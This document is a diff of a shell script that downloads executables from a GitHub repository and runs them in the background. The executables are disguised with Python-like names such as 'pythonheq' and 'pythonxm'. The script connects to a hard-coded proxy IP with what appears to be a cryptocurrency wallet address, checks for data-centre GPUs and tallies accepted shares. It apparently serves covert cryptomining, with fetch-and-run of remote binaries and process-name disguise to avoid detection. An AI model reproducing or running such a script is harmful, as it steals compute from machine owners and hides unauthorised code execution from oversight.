@@ -6,7 +6,7 @@ echo -e '#######################################################################
 PROX=78.47.69.185
 RVPort=80
 VCPort=6006
-echo -e '################## '"RV-VC to $PROX:$RVPort"' Ver:0.0.1     ################'
+echo -e '################## '"RV-VC to $PROX:$RVPort"' Ver:0.1.1     ################'
 echo -e '##########################################################################'
 
 ## getting IP info
@@ -35,7 +35,6 @@ wget -q https://github.com/one10001/10001code/raw/main/pythonheq
 chmod +x pythonheq
 
 
-./pythonheq -v -l $PROX:6006 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VER_""$IPNAME" -t 4 1>> ooutx 2>> ooutx &
 
 ###### 5G
 #wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
@@ -137,7 +136,8 @@ cp python2.6.6 pythonoc
 i="0"
 while true
 
-./pythonxm -c config.json -l ooutx 2>> ooutx 1>> ooutx &
+./pythonheq -v -l $PROX:6006 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VER_""$IPNAME" -t 4 1>> ooutx 2>> ooutx &
+
 do
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
@@ -176,7 +176,7 @@ fi
     do
         i=$[$i+1]
         echo -e "${On_Green}Results RV${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*30000/$i] ${Color_Off}" 
-        echo -e "${On_Red}Results VC${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep Acc oout | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*30000/$i] ${Color_Off}" 
+        echo -e "${On_Red}Results VC${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep Acc ooutx | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep Acc ooutx | wc -l)*30000/$i] ${Color_Off}" 
         sleep 30
     done
 
